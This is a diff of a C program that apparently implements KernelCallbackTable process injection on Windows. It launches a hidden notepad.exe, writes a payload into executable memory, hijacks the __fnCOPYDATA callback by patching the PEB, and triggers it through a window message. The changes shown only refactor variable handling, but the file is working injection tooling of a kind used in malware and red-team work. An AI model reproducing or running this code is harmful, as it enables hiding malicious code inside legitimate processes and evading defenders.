@@ -29,9 +29,6 @@ unsigned char payload[] =
 SIZE_T payloadSize = sizeof(payload);
 
 int main(int argc, char** argv) {
-    //DWORD PID = atoi(argv[1]);
-    DWORD PID;
-    HANDLE hProc;
     PROCESS_BASIC_INFORMATION pbi;
     PEB peb;
     SIZE_T dwBytesRead = 0;
@@ -40,6 +37,8 @@ int main(int argc, char** argv) {
     LPVOID pBaseAddress;
     LPVOID pNewKCT;
     NTSTATUS status;
+    PROCESS_INFORMATION pi;
+    STARTUPINFO si = { sizeof(STARTUPINFO) };
 
     // Get handle to process
     /*hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
@@ -47,16 +46,13 @@ int main(int argc, char** argv) {
 
     // Create Sacrifical Process
     info("Creating sacrifical process.");
-    PROCESS_INFORMATION pi;
-    STARTUPINFO si = { sizeof(STARTUPINFO) };
+    
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
     CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
     ok("Process %d created", pi.hProcess);
 
     Sleep(1000);
-    hProc = pi.hProcess;
-    PID = pi.dwProcessId;
 
     // Resolve NtQueryInformationProcess
     info("Resolving NtQueryInformationProcess().");
@@ -65,68 +61,68 @@ int main(int argc, char** argv) {
 
     // Read PBI
     info("Reading PEB and KCT.");
-    status = pNtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
+    status = pNtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
     if (status != 0) {
         error("Failed to read PEB and KCT, error: 0x%x", status);
-        TerminateProcess(hProc, 1);
+        TerminateProcess(pi.hProcess, 1);
         return EXIT_FAILURE;
     }
     ok("PROCESS_BASIC_INFORMATION at 0x%p", pbi);
     ok("PEB Base address: 0x%p", pbi.PebBaseAddress);
 
     // Read PEB
-    if (ReadProcessMemory(hProc, pbi.PebBaseAddress, &peb, sizeof(PEB), &dwBytesRead) == 0) {
+    if (ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), &dwBytesRead) == 0) {
         error("Failed to read PEB, error: %ld", GetLastError());
-        TerminateProcess(hProc, 1);
+        TerminateProcess(pi.hProcess, 1);
         return EXIT_FAILURE;
     }
     ok("KernelCallbackTable at 0x%p", peb.KernelCallbackTable);
     
     // Read KCT
     info("Reading KernelCallbackTable.");
-    if (ReadProcessMemory(hProc, peb.KernelCallbackTable, &kct, sizeof(KERNELCALLBACKTABLE), &dwBytesRead) == 0) {
+    if (ReadProcessMemory(pi.hProcess, peb.KernelCallbackTable, &kct, sizeof(KERNELCALLBACKTABLE), &dwBytesRead) == 0) {
         error("Failed to read KernelCallbackTable, error: %ld", GetLastError());
-        TerminateProcess(hProc, 1);
+        TerminateProcess(pi.hProcess, 1);
         return EXIT_FAILURE;
     }
     ok("KERNELCALLBACKTABLE.__fnCOPYDATA at 0x%p. Read %zu bytes", kct.__fnCOPYDATA, dwBytesRead);
 
     // Allocate and copy payload
     info("Copying payload to process.");
-    pBaseAddress = VirtualAllocEx(hProc, NULL, payloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+    pBaseAddress = VirtualAllocEx(pi.hProcess, NULL, payloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
     if (pBaseAddress == NULL) {
         error("Failed to allocate memory for payload, error: %ld", GetLastError());
-        TerminateProcess(hProc, 1);
+        TerminateProcess(pi.hProcess, 1);
         return EXIT_FAILURE;
     }
-    if (WriteProcessMemory(hProc, pBaseAddress, payload, payloadSize, &dwBytesRead) == 0) {
+    if (WriteProcessMemory(pi.hProcess, pBaseAddress, payload, payloadSize, &dwBytesRead) == 0) {
         error("Failed to write payload to allocated regeion, error: %ld", GetLastError());
-        TerminateProcess(hProc, 1);
+        TerminateProcess(pi.hProcess, 1);
         return EXIT_FAILURE;
     }
 
     // modify and copy KCT
     info("Creating modified KernelCallbackTable.");
-    pNewKCT = VirtualAllocEx(hProc, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    pNewKCT = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (pNewKCT == NULL) {
         error("Failed to allocate memory for modifed KernelCallbackTable, error %ld", GetLastError());
-        TerminateProcess(hProc, 1);
+        TerminateProcess(pi.hProcess, 1);
         return EXIT_FAILURE;
     }
 
     kct.__fnCOPYDATA = (ULONG_PTR)pBaseAddress;
-    if (WriteProcessMemory(hProc, pNewKCT, &kct, sizeof(KERNELCALLBACKTABLE), NULL) == 0) {
+    if (WriteProcessMemory(pi.hProcess, pNewKCT, &kct, sizeof(KERNELCALLBACKTABLE), NULL) == 0) {
         error("Failed to write modified KernelCallbackTable to allocated regeion, error: %ld", GetLastError());
-        TerminateProcess(hProc, 1);
+        TerminateProcess(pi.hProcess, 1);
         return EXIT_FAILURE;
     }
     ok("Payload at 0x%p, Modified KernelCallbackTable at 0x%p", pBaseAddress, pNewKCT);
 
     // Update PEB
     info("Patching PEB.");
-    if (WriteProcessMemory(hProc, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &pNewKCT, sizeof(ULONG_PTR), NULL) == 0) {
+    if (WriteProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &pNewKCT, sizeof(ULONG_PTR), NULL) == 0) {
         error("Failed to patch PEB, error: %ld", GetLastError());
-        TerminateProcess(hProc, 1);
+        TerminateProcess(pi.hProcess, 1);
         return EXIT_FAILURE;
     }
     ok("PEB.KernelCallbackTable now points to 0x%p", pBaseAddress);
@@ -143,8 +139,8 @@ int main(int argc, char** argv) {
     {
         hWnd = FindWindowEx(NULL, hWnd, NULL, NULL);
         GetWindowThreadProcessId(hWnd, &dwWindowPID);
-        if (dwWindowPID == PID) {
-            ok("Found window 0x%p belonging to process %d", hWnd, PID);
+        if (dwWindowPID == pi.dwProcessId) {
+            ok("Found window 0x%p belonging to process %d", hWnd, pi.dwProcessId);
 
             // Trigger payload
             info("Triggering callback.");
